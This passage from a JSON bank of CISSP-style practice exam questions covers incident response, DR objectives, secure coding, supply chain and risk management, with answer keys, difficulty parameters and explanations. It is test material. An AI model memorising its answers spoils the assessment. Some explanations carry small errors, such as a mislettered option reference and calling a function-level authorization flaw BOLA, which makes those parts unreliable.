      "explanation": "Correct Answer: Parallel DR tests often use pre-staged infrastructure, sanitized test data, and known conditions without real-world constraints. Actual disasters introduce full data volume, untested dependencies, staff stress, and unexpected failure modes. The test environment's RTO didn't account for provisioning time, real data restoration volume, or real-world coordination. More frequent tests help but don't resolve the staging-vs-reality gap. Full failover tests better validate RTO. RTO (not RPO) is the recovery time metric."
    },
    {
      "id": "d7-q29",
      "domain": "7 Security Operations",
      "stem": "An analyst detects a new internal host performing port scanning against the entire /16 subnet. The host is an endpoint workstation assigned to a marketing employee. What is the MOST critical concern, and what is the BEST immediate action?",
      "choices": [
        "Marketing employees occasionally need to test network connectivity — document the event and send the user a reminder about acceptable use",
        "Block the scanning traffic at the firewall and monitor to see if it continues",
        "The workstation is likely compromised and performing reconnaissance for lateral movement — isolate it from the network immediately while preserving forensic state, then investigate",
        "Disable the user's account, because internal port scanning always indicates intentional insider threat"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Correct Answer: A marketing workstation performing subnet-wide port scanning is highly anomalous — this is a strong indicator of compromise and attacker-initiated reconnaissance. Immediate isolation stops lateral movement while forensic preservation (RAM, running processes before shutdown) allows investigation. 'It might be legitimate' is not a reasonable assumption for this behavior. Account disabling alone doesn't contain an active compromise on the workstation. Firewall blocking without isolation leaves the compromised host on the network."
    },
    {
      "id": "d7-q30",
      "domain": "7 Security Operations",
      "stem": "After a major incident, the IR team conducts a lessons-learned meeting. The team lead wants to focus exclusively on what went wrong and who made poor decisions. A senior analyst suggests a blameless post-mortem instead. What is the PRIMARY benefit of a blameless post-mortem approach?",
      "choices": [
        "Blameless post-mortems are required under NIST SP 800-61 for all major incidents",
        "Blameless post-mortems protect underperforming team members from accountability",
        "Blameless post-mortems focus on systemic and process failures rather than individual errors, encouraging honest disclosure of what happened — which leads to more accurate root cause analysis and lasting improvements",
        "Blameless post-mortems eliminate the need for HR involvement in incident outcomes"
      ],
      "correctIndex": 2,
      "difficulty": 0.2,
      "discrimination": 1.05,
      "explanation": "Correct Answer: Blame-focused reviews cause team members to be defensive, conceal mistakes, and focus on self-protection — which obscures real root causes. Blameless post-mortems separate individual actions from systemic issues, creating psychological safety to share what actually happened. This produces actionable system improvements. They don't eliminate accountability — they separate learning from punishment. NIST 800-61 recommends lessons-learned but doesn't mandate blameless format. HR involvement is a separate process."
    },
    {
      "id": "d7-q31",
      "domain": "7 Security Operations",
      "stem": "An organization is choosing between an RTO of 2 hours and an RPO of 4 hours for a critical financial system, or an RTO of 8 hours and an RPO of 24 hours. The BIA shows that revenue loss begins at hour 4 and data older than 2 hours cannot be reconstructed from external sources. Which objectives are MOST appropriate?",
      "choices": [
        "The BIA data is insufficient — the CFO should set RTO and RPO based on budget",
        "RTO of 8 hours and RPO of 24 hours — these are standard enterprise DR targets",
        "RTO of 2 hours and RPO of 24 hours — recovery speed matters more than data currency",
        "RTO of 2 hours and RPO of 2 hours or less — revenue loss starting at hour 4 requires recovery before that, and the data reconstruction limit requires backups no older than 2 hours"
      ],
      "correctIndex": 3,
      "difficulty": 0.3,
      "discrimination": 1.05,
      "explanation": "Correct Answer: RTO must be less than 4 hours (revenue loss begins at hour 4) — 2-hour RTO satisfies this. RPO must be 2 hours or less (data older than 2 hours cannot be reconstructed) — the 4-hour RPO in option A would lose unrecoverable data. The BIA directly informs both objectives. The 8-hour/24-hour targets clearly violate both business constraints. RPO must address data recoverability, not just recovery speed. BIA data is precisely the input that should drive RTO/RPO decisions."
    },
    {
      "id": "d7-q32",
      "domain": "7 Security Operations",
      "stem": "A security operations team implements a SIEM with log ingestion from firewalls, endpoints, cloud services, and the enterprise directory service. Two weeks later, the team discovers that privileged user activity in a critical database is not being logged. What is the MOST critical risk from this gap?",
      "choices": [
        "Privileged database access is unmonitored — insider threats, SQL-level data exfiltration, and schema changes go undetected with no forensic trail for investigation",
        "SIEM storage costs will increase once database logging is added",
        "The database logs will overwhelm the SIEM correlation engine if added",
        "Database activity monitoring is the database administrator's responsibility and does not need to be included in the SIEM"
      ],
      "correctIndex": 0,
      "difficulty": 0.1,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Privileged database activity (direct SQL access, schema modifications, bulk exports) is a high-risk attack vector for insider threats and advanced attackers who have compromised DBA credentials. Without logging, these actions are invisible — both for real-time detection and forensic reconstruction. Storage cost is an operational concern, not the primary security risk. SIEM capacity can be managed by filtering; this is not a reason to skip logging. 'Shared responsibility' doesn't apply to an internal SIEM deployment."
    },
    {
      "id": "d8-q14",
      "domain": "8 Software Development Security",
      "stem": "A DevSecOps team integrates Software Composition Analysis (SCA) into the CI/CD pipeline. During a build, SCA identifies a critical CVE in an open-source library that is transitively included (not directly declared). The library has no available patch. What is the MOST appropriate response?",
      "choices": [
        "Override the SCA alert and proceed with the build since the vulnerability is transitive",
        "Remove all open-source dependencies and replace them with proprietary alternatives",
        "Accept the risk because transitive dependencies are the library vendor's responsibility",
        "Identify if the vulnerable code path is actually reachable in the application; if it is, find an alternative library or implement a compensating control and block the build until resolved"
      ],
      "correctIndex": 3,
      "difficulty": 0.4,
      "discrimination": 1.1,
      "explanation": "Correct Answer: Reachability analysis determines if the vulnerable function is actually called — many transitive dependency vulnerabilities are in code paths not exercised by the application. If reachable: find an alternative parent library that uses a non-vulnerable transitive version, or apply a compensating control. If not reachable: document and accept with justification. Organizations are responsible for all code in their build, including transitive dependencies. Overriding without analysis introduces known risk. Removing all OSS is operationally infeasible and doesn't address the root issue."
    },
    {
      "id": "d8-q15",
      "domain": "8 Software Development Security",
      "stem": "A security architect is reviewing a new microservice that stores API keys and database credentials in a configuration file checked into the application's Git repository. The developer argues the repository is private. What is the PRIMARY risk, and what is the correct remediation?",
      "choices": [
        "Encrypt the configuration file at rest using AES-256 and store the encryption key in a separate config file",
        "The risk is minimal since the repository is private — implement two-factor authentication on repository access",
        "Secrets in version control persist in commit history even after deletion — the correct remediation is a dedicated secrets management platform with secrets injected at runtime, and the repository history must be purged of the committed secrets",
        "Rotate the API keys annually to limit the impact of any exposure"
      ],
      "correctIndex": 2,
      "difficulty": 0.2,
      "discrimination": 1.05,
      "explanation": "Correct Answer: Secrets in version control are dangerous even when the repository is 'private' — repository access is often broader than expected, and secrets persist in commit history even after the file is deleted. The standard remediation is: use a dedicated secrets management platform for runtime injection, never store secrets in code, and perform a git history rewrite to purge the historical exposure. Private repo access can be compromised. An encrypted config file with a co-located key file is equivalent to plaintext. Annual rotation limits impact but doesn't remove the exposure from history."
    },
    {
      "id": "d8-q16",
      "domain": "8 Software Development Security",
      "stem": "A web application uses parameterized queries for most database interactions but has one legacy function that concatenates user input directly into a SQL string. A penetration test confirms SQL injection via this function. What is the definitive remediation?",
      "choices": [
        "Enable the database's built-in SQL injection detection feature",
        "Implement input validation to reject inputs containing SQL keywords like SELECT, DROP, and UNION",
        "Replace the string concatenation with a parameterized query or prepared statement — parameterization ensures user input is always treated as data, never as executable SQL",
        "Deploy a WAF rule to block SQL injection patterns before they reach the application"
      ],
      "correctIndex": 2,
      "difficulty": -0.1,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Parameterized queries/prepared statements are the definitive fix for SQL injection — user input is never interpreted as SQL syntax. Input validation (blocklists) is incomplete — attackers bypass SQL keyword filters with encoding, case variation, and alternative syntax. WAF rules are a compensating control and cannot reliably catch all SQL injection variants; they don't fix the root cause. Database detection features are detective, not preventive. Only parameterized queries eliminate the class of vulnerability."
    },
    {
      "id": "d8-q17",
      "domain": "8 Software Development Security",
      "stem": "A development team ships a container image to production that includes the full build toolchain, test frameworks, and development dependencies alongside the production application. A security review flags this as a risk. What is the MOST effective remediation from a supply chain and attack surface perspective?",
      "choices": [
        "Scan the container image with a vulnerability scanner before each deployment",
        "Use multi-stage container builds — compile and test in build-stage containers, then copy only the final artifacts into a minimal production base image, eliminating unnecessary tools and packages",
        "Run the container as a non-root user to limit the impact of any tools present",
        "Encrypt the container image at rest to prevent inspection of its contents"
      ],
      "correctIndex": 1,
      "difficulty": 0.3,
      "discrimination": 1.05,
      "explanation": "Correct Answer: Including build tools in production container images increases attack surface — an attacker who gains code execution has compilers, network utilities, and package managers available for further exploitation. Multi-stage builds separate build from runtime environments, producing minimal production images with only what's needed to run the application. Vulnerability scanning detects issues but doesn't reduce the surface. Non-root execution reduces privilege but doesn't remove unnecessary tools. Encrypting images at rest doesn't protect against runtime exploitation."
    },
    {
      "id": "d8-q18",
      "domain": "8 Software Development Security",
      "stem": "A software team releases a library to a public package registry. A month later, they discover an attacker published a package with a name one character different from theirs (e.g., 'util-auth' vs 'util_auth'), and several companies installed the malicious package instead. What attack is described, and what is the BEST preventive measure for package consumers?",
      "choices": [
        "Supply chain poisoning — the attacker compromised the legitimate package maintainer's account",
        "Typosquatting — consumers should verify package integrity using published checksums/signatures, pin exact version hashes in dependency manifests, and use namespaced packages where the registry supports them",
        "Sideloading — the attacker replaced the package on the consumer's local cache",
        "Dependency confusion — the attacker published a higher-versioned package to an internal registry that was resolved before the public one"
      ],
      "correctIndex": 1,
      "difficulty": 0.3,
      "discrimination": 1.05,
      "explanation": "Correct Answer: Typosquatting registers package names similar to popular ones to trick developers into installing malicious packages. Preventive measures: verify checksums/signatures before use, pin exact dependency hashes (lockfiles), audit package names carefully, and use scoped/namespaced packages. Dependency confusion is a different attack where internal package names are registered publicly with higher version numbers. Supply chain poisoning compromises the legitimate account. Sideloading describes mobile app distribution attacks."
    },
    {
      "id": "d8-q19",
      "domain": "8 Software Development Security",
      "stem": "A security engineer proposes adding RASP (Runtime Application Self-Protection) to a production API. The team asks what RASP provides that a WAF does not. Which answer is MOST accurate?",
      "choices": [
        "RASP operates inside the application runtime and can terminate malicious requests with full context of the call stack, data flow, and application state — a WAF operates externally and can only inspect the request payload without application context",
        "RASP is a network-layer control; WAF is an application-layer control — they protect different network layers",
        "RASP and WAF are equivalent; the difference is only in deployment location",
        "RASP encrypts all API responses to prevent data interception, while WAF only inspects inbound traffic"
      ],
      "correctIndex": 0,
      "difficulty": 0.5,
      "discrimination": 1.1,
      "explanation": "Correct Answer: RASP runs within the application process and has full context: it can see the actual database query being constructed, the data flow, and the call stack when a suspicious operation occurs — allowing it to block malicious behavior with precision. WAF inspects HTTP traffic externally using pattern matching and can be bypassed by encoding tricks. RASP doesn't handle encryption. WAF is an application-layer control, not network-layer. They are complementary controls, not equivalent."
    },
    {
      "id": "d8-q20",
      "domain": "8 Software Development Security",
      "stem": "During a design review, a threat modeling team identifies that the application's JWT tokens are signed with HMAC-SHA256 using a weak, short secret key. An attacker who discovers the key can forge valid tokens. What remediation BEST addresses this threat?",
      "choices": [
        "Increase the JWT token expiration from 24 hours to 1 hour to limit the window of token misuse",
        "Encode the JWT payload with Base64 URL encoding to prevent payload inspection",
        "Implement token binding to tie JWT tokens to specific TLS sessions",
        "Switch from HMAC-SHA256 (symmetric) to RS256 (asymmetric RSA signing) — the private key signs tokens server-side only, eliminating the need to share a secret; additionally use a strong random secret if HMAC is retained"
      ],
      "correctIndex": 3,
      "difficulty": 0.5,
      "discrimination": 1.1,
      "explanation": "Correct Answer: The root issue is key weakness in symmetric HMAC signing — any party with the secret can forge tokens. Switching to RS256 (asymmetric) means only the private key (held server-side) can sign tokens, while the public key is used for verification. This eliminates secret-sharing. If HMAC is retained, use a cryptographically random 256-bit+ secret. Shorter expiration reduces impact but doesn't fix forgery. JWT payloads are already Base64 URL encoded — this is encoding, not encryption, and doesn't provide security. Token binding is an additional layer but doesn't fix the key weakness."
    },
    {
      "id": "d8-q21",
      "domain": "8 Software Development Security",
      "stem": "An application team is releasing a new REST API. Security requirements specify that the API must enforce rate limiting on authentication endpoints. A developer asks why rate limiting is specifically important on auth endpoints. What is the MOST accurate explanation?",
      "choices": [
        "Rate limiting on auth endpoints prevents brute-force and credential stuffing attacks by limiting the number of authentication attempts an attacker can make within a given time period",
        "Rate limiting reduces server load on auth endpoints, primarily a performance optimization with secondary security benefits",
        "Rate limiting is required by OAuth 2.0 specifications for all token endpoints",
        "Rate limiting prevents SQL injection on the login form by limiting query execution frequency"
      ],
      "correctIndex": 0,
      "difficulty": -0.1,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Authentication endpoints are the primary target for brute-force (guessing passwords) and credential stuffing (replaying breached credential lists) attacks. Rate limiting directly constrains the speed of these attacks, making large-scale automated attempts infeasible within a useful time window. Server load reduction is a secondary benefit. Rate limiting doesn't prevent SQL injection — parameterization does. OAuth 2.0 recommends rate limiting as a best practice but doesn't define specific technical requirements for all token endpoints."
    },
    {
      "id": "d8-q22",
      "domain": "8 Software Development Security",
      "stem": "A development team is asked to produce a Software Bill of Materials (SBOM) for a government contract. A developer asks why the government requires an SBOM. What is the MOST accurate explanation?",
      "choices": [
        "An SBOM provides a formal inventory of all software components (libraries, frameworks, versions) used in the product — enabling rapid identification of whether a newly disclosed vulnerability affects the product, and supporting supply chain risk management",
        "An SBOM certifies that the software has been penetration tested and approved for government use",
        "An SBOM proves the software was developed domestically and not outsourced internationally",
        "An SBOM is a legal indemnification document that protects the government if the software contains defects"
      ],
      "correctIndex": 0,
      "difficulty": 0.1,
      "discrimination": 1.0,
      "explanation": "Correct Answer: SBOMs (per EO 14028 and NTIA guidance) provide transparency into software composition — when a vulnerability like Log4Shell is disclosed, organizations with SBOMs can immediately determine which products contain the affected component. SBOMs support supply chain risk management, not certification of testing. They are not legal indemnification documents. They describe components and their provenance, not geographic origin of development."
    },
    {
      "id": "d8-q23",
      "domain": "8 Software Development Security",
      "stem": "A code review finds that an internal admin API doesn't validate authorization on each endpoint — it checks authentication (valid JWT) but not whether the authenticated user is authorized to perform the action. An authenticated non-admin user can call admin endpoints. What vulnerability does this represent?",
      "choices": [
        "Broken Object Level Authorization (BOLA) / Insecure Direct Object Reference — the API fails to verify that the caller has rights to the specific operation, only that they are authenticated",
        "Cross-site request forgery — an attacker can forge requests from a user's browser",
        "Authentication bypass — the API is accepting invalid JWT tokens",
        "SQL injection — the admin endpoints are vulnerable to database manipulation"
      ],
      "correctIndex": 0,
      "difficulty": 0.2,
      "discrimination": 1.05,
      "explanation": "Correct Answer: The vulnerability is missing function-level authorization — the API verifies identity (authentication) but not permission (authorization) at the endpoint level. This is classified as BOLA/Broken Access Control (OWASP API Security #1 / OWASP Top 10 A01). Authentication bypass would mean invalid tokens are accepted. CSRF involves cross-site request forgery using valid user sessions. SQL injection involves malicious query construction."
    },
    {
      "id": "d8-q24",
      "domain": "8 Software Development Security",
      "stem": "A security review of an internal CI/CD pipeline finds that the build process runs with full administrative access to the production environment. Any compromise of the build system would allow an attacker to deploy arbitrary code to production. What is the MOST important architectural control to implement?",
      "choices": [
        "Implement SAST scanning on all pull requests to catch vulnerabilities before they reach the build",
        "Apply least privilege to the CI/CD pipeline — build accounts should only have the permissions needed to deploy approved artifacts to staging, with production deployments requiring explicit approval gates and separate deployment credentials",
        "Enable MFA for all developers who commit code to the repository",
        "Encrypt all build artifacts using AES-256 before they are stored in the artifact repository"
      ],
      "correctIndex": 1,
      "difficulty": 0.3,
      "discrimination": 1.05,
      "explanation": "Correct Answer: A CI/CD pipeline with full production administrative access is a high-value target — compromising the build system is equivalent to compromising production. Least privilege and approval gates (human review before production deploy) are the critical architectural controls. Artifact encryption protects confidentiality of builds, not the authorization control issue. Developer MFA protects code repository access but doesn't limit pipeline permissions. SAST catches code-level issues but not pipeline privilege abuse."
    },
    {
      "id": "d8-q25",
      "domain": "8 Software Development Security",
      "stem": "An application accepts file uploads from users. The server saves uploaded files to a directory under the web root. A penetration tester uploads a PHP webshell as 'shell.php' and executes it by browsing to its URL, gaining remote code execution. Which combination of controls MOST comprehensively prevents this attack?",
      "choices": [
        "Require user authentication before file upload to limit who can upload files",
        "Validate file type by content (magic bytes), not extension alone; rename uploaded files to random names without extensions; store uploaded files outside the web root; and configure the web server to not execute scripts in the upload directory",
        "Limit file upload size to 10MB to prevent large malicious files",
        "Scan uploaded files with antivirus before saving them to disk"
      ],
      "correctIndex": 1,
      "difficulty": 0.4,
      "discrimination": 1.1,
      "explanation": "Correct Answer: File upload vulnerabilities require defense-in-depth: (1) content-based type validation (magic bytes) rejects disguised executables; (2) random filenames without extensions prevent predictable URL execution; (3) storage outside the web root prevents direct URL access; (4) server configuration to deny script execution in upload directories. Any single control can be bypassed. File size limits don't prevent small webshells. Authentication limits scope but doesn't prevent authorized users from uploading malicious files. AV scanning has bypass techniques and is a supplementary control."
    },
    {
      "id": "d8-q26",
      "domain": "8 Software Development Security",
      "stem": "A development team delivers features via frequent small releases (trunk-based development). The security team wants to ensure security gates don't slow releases while maintaining assurance. Which security testing integration model BEST supports this development model?",
      "choices": [
        "Perform all security testing manually at the end of each quarter to avoid slowing the development process",
        "Run a comprehensive security assessment before every release, blocking deployment until all findings are remediated",
        "Allow developers to self-certify that their code is secure to maintain release velocity",
        "Shift-left with automated security gates in the CI pipeline (SAST on commit, SCA on dependency change, secret scanning on every push) with fast feedback loops, and periodic deeper assessments (DAST, pentest) on a release cadence"
      ],
      "correctIndex": 3,
      "difficulty": 0.2,
      "discrimination": 1.05,
      "explanation": "Correct Answer: Trunk-based development with frequent small releases requires automated security gates that run fast and don't block the pipeline for minor issues. Shift-left means catching issues early (on commit) when they're cheapest to fix. Automated SAST/SCA/secret scanning provide fast feedback. Deeper periodic assessments (DAST, pentest) complement automated scanning without gating every release. Comprehensive assessment before every release becomes the bottleneck that breaks CI/CD. Quarterly manual testing is too infrequent for continuous delivery. Self-certification eliminates assurance."
    },
    {
      "id": "d1-q41",
      "domain": "1 Security and Risk Management",
      "stem": "A payroll clerk is responsible for entering new employee salary records AND approving the resulting payments without any secondary review. An auditor flags this arrangement as a control weakness. Which principle is MOST directly violated, and what is the SIMPLEST corrective action?",
      "choices": [
        "Least privilege — remove the clerk's access to the payroll system until a full access review is completed",
        "Separation of duties — split the entry and approval functions between two different employees so no single person can both initiate and authorize a payment",
        "Need to know — restrict the clerk's visibility to only the salary fields relevant to their own department",
        "Mandatory vacation — require the clerk to take two weeks off so a backup can review the records independently"
      ],
      "correctIndex": 1,
      "difficulty": -0.8,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Separation of duties — split entry and approval. When one person can both initiate a transaction and authorize it, they have unchecked ability to commit fraud or errors without detection. Separating entry from approval ensures at least two people are involved in any financial transaction. Least privilege addresses over-broad access but doesn't address the conflict of having two incompatible functions. Need-to-know limits data visibility, not transactional authority. Mandatory vacation is a detective fraud-detection control, not a structural fix for the separation gap."
    },
    {
      "id": "d1-q42",
      "domain": "1 Security and Risk Management",
      "stem": "A newly onboarded software developer is given full administrator access to all production servers 'to make sure they can do their job.' The security team reviews this access one week later. What is the FIRST action they should take?",
      "choices": [
        "Leave the access in place and schedule it for review at the next quarterly access certification",
        "Reduce the developer's access to only the systems and permissions required for their specific assigned tasks",
        "Require the developer to complete security awareness training before access is reviewed",
        "Disable the developer's account entirely until a formal access request is submitted and approved"
      ],
      "correctIndex": 1,
      "difficulty": -0.85,
      "discrimination": 0.95,
      "explanation": "Correct Answer: Reduce access to what is actually needed — principle of least privilege. Least privilege requires that users receive only the minimum access necessary for their job function. Full production admin access for a developer violates this principle immediately. The first action is right-sizing the access, not waiting for a quarterly cycle that leaves the over-permission in place for months. Disabling the account entirely is disruptive and unnecessary — the goal is appropriate access, not no access. Awareness training is not a substitute for fixing the access model."
    },
    {
      "id": "d1-q43",
      "domain": "1 Security and Risk Management",
      "stem": "After a wave of successful phishing emails that led to three compromised accounts, senior leadership asks what single control would MOST reduce the likelihood of employees clicking malicious links in the near term, given that no technical email filtering changes can be deployed for 30 days.",
      "choices": [
        "Targeted security awareness training and phishing simulation exercises focused on recognizing the specific techniques used in the recent attacks",
        "Disable external email access for all staff until the email filtering upgrade is deployed",
        "Require all employees to change their passwords immediately to prevent further use of compromised credentials",
        "Notify employees that disciplinary action will be taken if they click phishing links in the future"
      ],
      "correctIndex": 0,
      "difficulty": -0.7,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Targeted awareness training and phishing simulations. When technical controls are temporarily unavailable, compensating controls focus on the human layer. Training employees to recognize the specific social engineering patterns used in recent attacks is the most direct near-term reduction in click likelihood. Password resets address compromised credentials but don't reduce future phishing susceptibility. Disabling external email is operationally disruptive and disproportionate for most organizations. Threatening disciplinary action without training doesn't give employees the skills to identify phishing."
    },
    {
      "id": "d1-q44",
      "domain": "1 Security and Risk Management",
      "stem": "A risk manager documents a vulnerability that could expose customer financial data. The cost to patch the vulnerability is $5,000. The estimated loss if exploited is $4,000. No regulatory penalties apply. What is the MOST defensible risk treatment decision?",
      "choices": [
        "Mitigate the risk — any vulnerability exposing customer data must be remediated regardless of cost",
        "Avoid the risk — decommission the system containing the vulnerability immediately",
        "Transfer the risk — purchase cyber insurance to cover the $4,000 potential loss",
        "Accept the risk — the cost to remediate exceeds the expected loss, so the organization may rationally choose to accept rather than spend more than the risk is worth"
      ],
      "correctIndex": 3,
      "difficulty": -0.65,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Accept the risk. When the cost of remediation exceeds the expected loss and no regulatory obligation mandates patching, risk acceptance is a rational and defensible business decision. Risk management is about cost-justified decisions — spending $5,000 to prevent a $4,000 loss is economically irrational without other factors. Blanket remediation regardless of cost is not how risk management works. Transferring via insurance adds ongoing premium cost which would exceed the $4,000 loss over time. Decommissioning an entire system to avoid a $4,000 risk is disproportionate."
    },
    {
      "id": "d1-q45",
      "domain": "1 Security and Risk Management",
      "stem": "An organization's acceptable use policy (AUP) states that company systems may not be used for personal activities. An employee uses a company laptop to manage a personal social media account during lunch. HR asks the security team whether this is a policy violation. What is the MOST accurate assessment?",
      "choices": [
        "No — using personal social media during unpaid lunch hours is a personal activity and the AUP only applies to work hours",
        "No — unless the activity caused measurable harm, AUP violations during non-work time are unenforceable",
        "Yes — using a company system for personal activity violates the AUP regardless of timing; the organization should address it through the defined disciplinary process",
        "Uncertain — the AUP needs to be rewritten to specify whether it applies to break times before any enforcement action"
      ],
      "correctIndex": 2,
      "difficulty": -0.7,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Yes — this is an AUP violation. The AUP governs use of the company system (the laptop), not the employee's personal time. The restriction applies to the asset, not the schedule. Using company equipment for personal social media activity during any time of day violates the stated policy. The organization should follow its defined disciplinary process. Time of day doesn't change whether the company asset is being used for personal purposes. Harm is not a prerequisite for a policy violation to exist — violations are defined by policy terms, not outcomes. The policy is sufficiently clear; rewriting it to add a time qualifier is unnecessary."
    },
    {
      "id": "d1-q46",
      "domain": "1 Security and Risk Management",
      "stem": "A security manager presents the organization's risk register to the executive team. An executive asks why a known high-severity vulnerability in a public-facing web server has been marked 'accepted' in the register for the past two quarters with no remediation. What documentation should the security manager be able to produce to justify this status?",
      "choices": [
        "Evidence that the vulnerability is listed in the CVE database, confirming it is a known issue and not specific to the organization",
        "The original vulnerability scan report showing the finding, which establishes that the risk was identified and tracked",
        "A signed risk acceptance statement from a business owner with appropriate authority, documenting the risk, rationale, and planned review date",
        "A vendor advisory stating the vulnerability has a workaround available, which demonstrates the organization is aware of mitigation options"
      ],
      "correctIndex": 2,
      "difficulty": -0.65,
      "discrimination": 1.0,
      "explanation": "Correct Answer: A signed risk acceptance statement from an authorized business owner. Risk acceptance is a formal decision, not a default state. It requires documented acknowledgment of the risk, the business rationale for not remediating it, authorization by an appropriate owner, and a review date. Without this, the 'accepted' status is just unacted-upon neglect, not formal risk management. The scan report shows discovery but not acceptance. CVE presence is irrelevant to the acceptance decision. A vendor advisory showing a workaround exists actually undermines the acceptance rationale — if a workaround is available, acceptance requires explaining why it hasn't been applied."
    },
    {
      "id": "d2-q27",
      "domain": "2 Asset Security",
      "stem": "A printed report containing customer Social Security numbers is left unattended on a shared printer in an open office area for two hours. A clean desk policy is in effect. Which control, if enforced, would MOST directly have prevented this exposure?",
      "choices": [
        "Secure print release — requiring the sender to authenticate at the printer before the document prints, so sensitive output is never left unattended",
        "Network segmentation — placing the printer on a separate VLAN from workstations to reduce access",
        "A clean desk reminder email sent to all staff at the end of each business day",
        "Full-disk encryption on employee laptops — preventing data from being saved locally before printing"
      ],
      "correctIndex": 0,
      "difficulty": -0.75,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Secure print release (pull printing). Secure print release holds print jobs in a queue until the sender authenticates at the printer, ensuring sensitive documents are never left unattended. This directly prevents the physical exposure scenario. Network segmentation controls which systems can send print jobs but doesn't prevent unattended output once printing occurs. Laptop encryption protects stored data, not printed output. A reminder email relies on human compliance rather than enforcing the policy technically."
    },
    {
      "id": "d2-q28",
      "domain": "2 Asset Security",
      "stem": "An organization is retiring 50 laptops that were used by the HR department to process employee personal data. The IT team proposes donating the laptops to a local school after a standard operating system factory reset. The security team objects. What is the MOST appropriate data sanitization method before donation?",
      "choices": [
        "Delete all files and empty the recycle bin, then run a virus scan to confirm no malware remains",
        "Overwrite all storage with a recognized multi-pass sanitization tool (e.g., DoD 5220.22-M or NIST 800-88 clear/purge), verified by a sanitization report before transfer",
        "Perform an operating system factory reset, which restores the OS to default and removes all user files",
        "Remove the user account profiles from the laptops to eliminate access to personal data"
      ],
      "correctIndex": 1,
      "difficulty": -0.7,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Verified multi-pass overwrite per NIST 800-88. Factory resets and file deletion do not overwrite the underlying sectors — data recovery tools can restore deleted files and user data with minimal effort. NIST 800-88 'Clear' or 'Purge' operations overwrite media to prevent recovery. A sanitization report provides audit evidence that the process was completed. Removing user profiles only removes directory pointers — the actual data remains on disk. Virus scans detect malware but have no bearing on data remanence or recovery."
    },
    {
      "id": "d2-q29",
      "domain": "2 Asset Security",
      "stem": "A business analyst exports a dataset containing employee salary information to a USB drive to work on it at home. The organization's data classification policy labels salary data as Confidential. The removable media policy requires encryption on all portable storage. The analyst claims they did not know about the encryption requirement. What should the organization's FIRST response be?",
      "choices": [
        "Reclassify salary data as Internal so that removable media restrictions no longer apply",
        "Excuse the violation since the analyst was unaware of the policy and update the training materials for the next cycle",
        "Treat it as a policy violation and potential data exposure incident — retrieve the USB drive, assess whether unauthorized access occurred, and initiate awareness remediation",
        "Immediately terminate the analyst's employment because handling Confidential data on unencrypted media is a terminable offense"
      ],
      "correctIndex": 2,
      "difficulty": -0.75,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Treat it as a policy violation and potential incident — retrieve, assess, and remediate. Ignorance of policy doesn't eliminate the violation or the exposure risk. The first step is containing the risk (retrieve the USB, assess access) and then addressing the training gap. Excusing the violation without incident assessment ignores the active data exposure risk. Termination may be appropriate depending on severity and HR policy but is not the FIRST response — assessment comes before disciplinary action. Reclassifying the data to avoid the policy requirement inverts the security hierarchy."
    },
    {
      "id": "d2-q30",
      "domain": "2 Asset Security",
      "stem": "An organization maintains a data asset inventory. During a quarterly review, the team discovers that a database containing customer contact information has no assigned data owner and no classification label. What is the MOST appropriate FIRST action?",
      "choices": [
        "Classify the database as Public since no sensitive-data label was applied during creation",
        "Leave the database as-is and flag it for the annual data governance review",
        "Delete the database immediately since unclassified and unowned data presents an unmanaged risk",
        "Assign an interim classification based on the sensitivity of the contents and escalate to identify a business owner who can formally take accountability"
      ],
      "correctIndex": 3,
      "difficulty": -0.8,
      "discrimination": 0.95,
      "explanation": "Correct Answer: Apply an interim classification and escalate to assign a data owner. Unclassified data should be treated as the organization's default classification (typically Internal or Confidential for customer data) until formally reviewed. Assigning an interim label protects the data immediately while the governance gap is resolved. Deleting the database is destructive — the data may be needed for business operations and its value hasn't been assessed. Deferring to the annual review leaves customer contact data unprotected for months. Defaulting to Public is the most dangerous option — it would permit unrestricted access to customer data."
    },
    {
      "id": "d3-q33",
      "domain": "3 Security Architecture and Engineering",
      "stem": "A security architect is designing a new customer-facing web portal. The architecture review asks where a public-facing web server should be placed relative to internal application servers and databases. What placement BEST limits the blast radius if the web server is compromised?",
      "choices": [
        "Place the web server directly on the internal network alongside the database for low-latency access",
        "Place the web server in the cloud and connect it to the internal network via an always-on VPN tunnel",
        "Place the web server on the same subnet as internal workstations to simplify network management",
        "Place the web server in a DMZ, with firewall rules requiring it to communicate to internal app servers only on specific required ports — not with direct internal network access"
      ],
      "correctIndex": 3,
      "difficulty": -0.7,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Web server in a DMZ with controlled firewall access to internal tiers. A DMZ (demilitarized zone) places internet-facing systems in a separate network segment. If the web server is compromised, the attacker is isolated in the DMZ and must break through a second firewall to reach internal systems. Placing the web server on the internal network eliminates this isolation and allows a compromised server to pivot directly to databases and workstations. An always-on VPN tunnel from a cloud server creates a permanent bridge from an internet-exposed system to the internal network — the same problem as no DMZ."
    },
    {
      "id": "d3-q34",
      "domain": "3 Security Architecture and Engineering",
      "stem": "A database administrator reports that a production database storing customer credit card data currently has encryption in transit (TLS) but no encryption at rest. A security review flags this as insufficient. What is the PRIMARY risk that encryption at rest would address that TLS alone does not?",
      "choices": [
        "Physical or direct-access compromise of the storage media — an attacker with access to the disk files, backup tapes, or database files can read plaintext data without encryption at rest even if TLS protects network traffic",
        "Man-in-the-middle interception of data as it travels between the application and the database",
        "Unauthorized access by users with valid database credentials and query permissions",
        "SQL injection attacks targeting the application layer above the database"
      ],
      "correctIndex": 0,
      "difficulty": -0.65,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Physical or direct-access exposure of storage media. TLS protects data in transit across the network. It does nothing to protect data that is stored on disk in plaintext. An attacker who steals backup tapes, accesses underlying storage, or reads database files directly (bypassing the application layer) sees plaintext without encryption at rest. Man-in-the-middle attacks on network traffic are what TLS prevents. SQL injection is an application-layer vulnerability unrelated to storage encryption. Authorized database credentials bypass both TLS and encryption at rest — access control is a separate problem."
    },
    {
      "id": "d3-q35",
      "domain": "3 Security Architecture and Engineering",
